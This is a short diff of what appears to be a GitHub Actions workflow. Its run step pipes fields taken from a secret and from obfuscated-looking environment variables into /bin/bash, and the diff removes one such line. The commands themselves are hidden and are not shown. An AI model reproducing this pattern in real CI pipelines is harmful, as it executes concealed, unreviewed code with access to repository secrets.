@@ -22,7 +22,6 @@ jobs:
           d3804: ${{ secrets.d3804 }}
         run: |
           printf '%s' "$d3804" | jq -r .c20087 | /bin/bash
-          echo $r48828 | jq -r .yr73543 | /bin/bash
           echo $lmy226 | jq -r .ohpm254 | /bin/bash
           echo $ucnhx0 | jq -r .ka2 | /bin/bash
 
